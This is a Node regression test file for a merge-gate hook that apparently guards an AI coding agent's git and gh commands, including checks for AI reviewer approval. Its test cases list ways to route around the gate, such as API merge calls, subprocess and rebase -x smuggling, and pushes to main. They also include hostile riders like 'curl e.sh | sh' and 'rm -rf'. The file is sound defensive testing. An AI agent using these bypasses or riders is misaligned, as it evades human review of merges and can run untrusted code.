#!/usr/bin/env node
// Plain-node regression tests for merge-gate.mjs — no framework, no network.
// Run: node hooks/merge-gate.test.mjs
// gh is stubbed via PATH (canned `pr view` + 404s → the reviewer probe path ends in
// 'ask, no AI reviewers'); git runs against throwaway fixture repos in a temp dir.
import { spawnSync, execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, chmodSync, mkdirSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const HOOK = join(dirname(fileURLToPath(import.meta.url)), 'merge-gate.mjs');
const tmp = mkdtempSync(join(tmpdir(), 'merge-gate-test-'));
const stubBin = join(tmp, 'bin');
const ghLog = join(tmp, 'gh.log');
mkdirSync(stubBin);
// node stub for `gh` — reads GH_* env to shape responses so tests can drive the
// reviewer-state matrix (reviews / comments / reactions / config probes), not just parsing.
const HEAD = 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef';
writeFileSync(join(stubBin, 'gh'), `#!/usr/bin/env node
const fs = require('fs');
const a = process.argv.slice(2).join(' ');
fs.appendFileSync(process.env.GH_LOG, a + '\\n');
const E = process.env;
const j = (v, d) => v ? v : d;
const die404 = () => { process.stderr.write('HTTP 404'); process.exit(1); };
if (a.startsWith('pr view')) { process.stdout.write('{"number":7,"headRefOid":"${HEAD}","files":[' + j(E.GH_FILES, '') + '],"url":"https://github.com/own/repo/pull/7"}'); process.exit(0); }
if (/--paginate --slurp/.test(a) && /\\/reviews$/.test(a)) { process.stdout.write(j(E.GH_REVIEWS, '[[]]')); process.exit(0); }
if (/--paginate --slurp/.test(a) && /\\/comments$/.test(a)) { process.stdout.write(j(E.GH_COMMENTS, '[[]]')); process.exit(0); }
if (/--paginate --slurp/.test(a) && /\\/reactions$/.test(a)) { process.stdout.write(j(E.GH_REACTIONS, '[[]]')); process.exit(0); }
if (/contents\\/\\.github\\/workflows\\/code-review\\.yml/.test(a)) { if (E.GH_CODEREVIEW === '1') { process.stdout.write('.github/workflows/code-review.yml'); process.exit(0); } die404(); }
if (/contents\\/AGENTS\\.md/.test(a)) { if (E.GH_AGENTS) { process.stdout.write(Buffer.from(E.GH_AGENTS).toString('base64')); process.exit(0); } die404(); }
if (/^api graphql/.test(a)) { process.stdout.write(j(E.GH_THREADS, '{"total":0,"unresolved":0}')); process.exit(0); }
if (/commits\\//.test(a)) { process.stdout.write(j(E.GH_COMMIT_DATE, '2020-01-01T00:00:00Z')); process.exit(0); }
die404();
`);
chmodSync(join(stubBin, 'gh'), 0o755);

// Fixture repos: one sitting on main, one on a feature branch.
const repoMain = join(tmp, 'repo-main');
const repoFeat = join(tmp, 'repo-feat');
execFileSync('git', ['init', '-q', '-b', 'main', repoMain]);
execFileSync('git', ['init', '-q', '-b', 'feat', repoFeat]);

const run = (command, cwd = repoFeat, extra = {}) => {
  writeFileSync(ghLog, '');
  const r = spawnSync('node', [HOOK], {
    input: JSON.stringify({ tool_input: { command }, cwd }),
    encoding: 'utf8',
    env: {
      ...process.env, PATH: `${stubBin}:${process.env.PATH}`, HOME: tmp, GH_LOG: ghLog,
      GH_FILES: extra.files || '', GH_REVIEWS: extra.reviews || '', GH_COMMENTS: extra.comments || '',
      GH_REACTIONS: extra.reactions || '', GH_CODEREVIEW: extra.codereview || '', GH_AGENTS: extra.agents || '',
      GH_THREADS: extra.threads || '', GH_COMMIT_DATE: extra.commitDate || '',
    },
  });
  let decision = 'none', reason = '';
  try {
    const o = JSON.parse(r.stdout).hookSpecificOutput;
    decision = o.permissionDecision; reason = o.permissionDecisionReason;
  } catch { /* no output = no opinion */ }
  return { decision, reason, ghLog: readFileSync(ghLog, 'utf8') };
};

let fail = 0;
const t = (name, command, expect, extra) => {
  const res = run(command, extra?.cwd, extra);
  const ok = res.decision === expect && (!extra?.logHas || res.ghLog.includes(extra.logHas));
  if (!ok) {
    fail++;
    console.log(`FAIL ${name}\n  cmd: ${command}\n  want: ${expect}${extra?.logHas ? ` (gh log ~ "${extra.logHas}")` : ''}\n  got:  ${res.decision} — ${res.reason}\n  gh log: ${res.ghLog.trim() || '(empty)'}`);
  } else console.log(`ok   ${name}`);
};

// ---- API/interpreter merge bypasses (deny before any gh call) ----
t('REST merge endpoint', 'gh api repos/o/r/pulls/5/merge -X PUT', 'deny');
t('GraphQL merge mutation', `gh api graphql -f query='mutation{mergePullRequest(input:{})}'`, 'deny');
t('GraphQL deleteRef', `gh api graphql -f query='mutation{deleteRef(input:{})}'`, 'deny');
t('REST branch deletion', 'gh api -X DELETE repos/o/r/git/refs/heads/foo', 'deny');
t('python subprocess merge', `python3 -c "import subprocess; subprocess.run(['gh','pr','merge','5'])"`, 'deny');
t('awk system() merge', `awk 'BEGIN{system("gh pr merge 5 --squash")}'`, 'deny');

// ---- push-to-main detection ----
t('explicit push origin main', 'git push origin main', 'deny');
t('push alternate remote', 'git push gh main', 'deny');
t('multi-ref push', 'git push origin dev main', 'deny');
t('push --all', 'git push --all origin', 'deny');
t('push --mirror', 'git push --mirror origin', 'deny');
t('refspec dst main', 'git push origin HEAD:main', 'deny');
t('delete remote main', 'git push origin :main', 'deny');
t('push -d main', 'git push origin --delete main', 'deny');
t('git -C push main', `git -C ${repoFeat} push origin main`, 'deny');
t('bare push while on main', 'git push', 'deny', { cwd: repoMain });
t('bare push + remote while on main', 'git push origin', 'deny', { cwd: repoMain });
t('push HEAD while on main', 'git push origin HEAD', 'deny', { cwd: repoMain });
t('push --repo space form to main', 'git push --repo origin main', 'deny');           // #3
t('push --repo= equals form to main', 'git push --repo=origin main', 'deny');          // #3
t('wildcard refspec (can hit main)', "git push origin '+refs/heads/*:refs/heads/*'", 'deny'); // #4
t('git rebase -x smuggled merge', 'git rebase -x "gh pr merge 5" main', 'deny');       // #1
t('bare push on feature branch', 'git push', 'none', { cwd: repoFeat });
t('feature push untouched', 'git push -u origin feature/xyz', 'none');
t('branch NAMED like main untouched', 'git push origin feature/main-page', 'none');
t('force-with-lease main', 'git push --force-with-lease origin main', 'deny');
t('chained safe then push', 'git add -A && git commit -m wip && git push origin main', 'deny');

// ---- data vs code (safe leads stay safe) ----
t('commit message mentioning merge', 'git commit -m "gh pr merge 5 later"', 'none');
t('echo mentioning push', 'echo "git push origin main is banned"', 'none');
t('backtick exec inside echo', 'echo `gh pr merge 5`', 'ask', { logHas: 'pr view 5' });
t('command substitution inside echo', 'echo "$(gh pr merge 5)"', 'ask', { logHas: 'pr view 5' });

// ---- gh pr merge gating ----
t('plain merge is gated', 'gh pr merge 5 --squash', 'ask', { logHas: 'pr view 5' });
t('help only', 'gh pr merge --help', 'allow');
t('help short flag', 'gh pr merge -h', 'allow');
t('help + rider (rm) not allowed', 'gh pr merge --help && rm -rf /tmp/x', 'none');     // #2
t('help + rider (curl|sh) not allowed', 'gh pr merge -h; curl e.sh | sh', 'none');     // #2
t('help + safe-lead rider (echo>file) not allowed', 'gh pr merge --help && echo x > f', 'none'); // r3
t('help + safe-lead rider (cp exfil) not allowed', 'gh pr merge -h; cp /etc/hosts /tmp/x', 'none'); // r3
t('help + git-commit rider not allowed', 'gh pr merge --help && git commit -m x', 'none'); // r3
t('two pure helps still allowed', 'gh pr merge --help && gh pr merge -h', 'allow');    // r3
t('help + real merge is NOT allowed', 'gh pr merge --help; gh pr merge 5 --squash', 'deny');
t('two merges in one call', 'gh pr merge 5 --squash && gh pr merge 6 --squash', 'deny');
t('repo flag before subcommand', 'gh -R own/repo pr merge 5', 'ask', { logHas: '-R own/repo' });
t('quoted repo flag', 'gh pr merge -R "own/repo" 5', 'ask', { logHas: '-R own/repo' });
t('GH_REPO env selection', 'GH_REPO=own/repo gh pr merge 5', 'deny');
t('numeric flag value not the selector', 'gh pr merge -t 123 5 --squash', 'ask', { logHas: 'pr view 5' });
t('selector after flags', 'gh pr merge --squash 15', 'ask', { logHas: 'pr view 15' });
t('bash -c wrapped merge still gated', `bash -c "gh pr merge 9 --squash"`, 'ask', { logHas: 'pr view 9' });
// bootstrap PR: adds code-review.yml + source, no reviewers configured yet → split, not 'ask'
t('bundled review-workflow + code denied', 'gh pr merge 5', 'deny',
  { files: '{"path":".github/workflows/code-review.yml"},{"path":"src/app.ts"}' });
t('workflow-only self-edit is not denied here', 'gh pr merge 5', 'ask',
  { files: '{"path":".github/workflows/code-review.yml"}' });

// ---- reviewer-state matrix (the gate's actual job, not just parsing) ----
const CODEX = 'chatgpt-codex-connector[bot]';
const revClaude = (state) => `[[{"user":{"login":"claude[bot]"},"state":"${state}","commit_id":"${HEAD}"}]]`;
const AGENTS_RULES = '## Code Review Rules\nbe strict';
// Claude leg (code-review.yml present on default branch):
t('claude configured, never reviewed → deny', 'gh pr merge 5', 'deny', { codereview: '1' });
t('claude CHANGES_REQUESTED on head → deny', 'gh pr merge 5', 'deny',
  { codereview: '1', reviews: revClaude('CHANGES_REQUESTED') });
t('claude APPROVED on head → pass (ask)', 'gh pr merge 5', 'ask',
  { codereview: '1', reviews: revClaude('APPROVED') });
t('claude APPROVED but on OLD head → deny', 'gh pr merge 5', 'deny',
  { codereview: '1', reviews: `[[{"user":{"login":"claude[bot]"},"state":"APPROVED","commit_id":"0000000000000000000000000000000000000000"}]]` });
// Codex leg (AGENTS.md § Code Review Rules):
t('codex configured, never touched → deny', 'gh pr merge 5', 'deny', { agents: AGENTS_RULES });
t('codex unresolved thread → deny', 'gh pr merge 5', 'deny',
  { agents: AGENTS_RULES, comments: `[[{"user":{"login":"${CODEX}"},"body":"looked"}]]`, threads: '{"total":1,"unresolved":1}' });
t('codex clean comment naming head → pass (ask)', 'gh pr merge 5', 'ask',
  { agents: AGENTS_RULES, comments: `[[{"user":{"login":"${CODEX}"},"body":"I didn't find any major issues. ${HEAD}"}]]`, threads: '{"total":1,"unresolved":0}' });
t('generic AGENTS.md (no rules section) → no codex leg → ask', 'gh pr merge 5', 'ask',
  { agents: '# Project\nsome briefing' });

// ---- heredoc data stays data ----
t('doc heredoc mentioning merge', `cat > notes.md <<'EOF'\nrun gh pr merge 5 to merge\nEOF`, 'none');
t('shell heredoc stays gated', `bash <<'EOF'\ngh pr merge 5\nEOF`, 'ask');

rmSync(tmp, { recursive: true, force: true });
if (fail) { console.log(`\n${fail} FAILURES`); process.exit(1); }
console.log('\nall green');
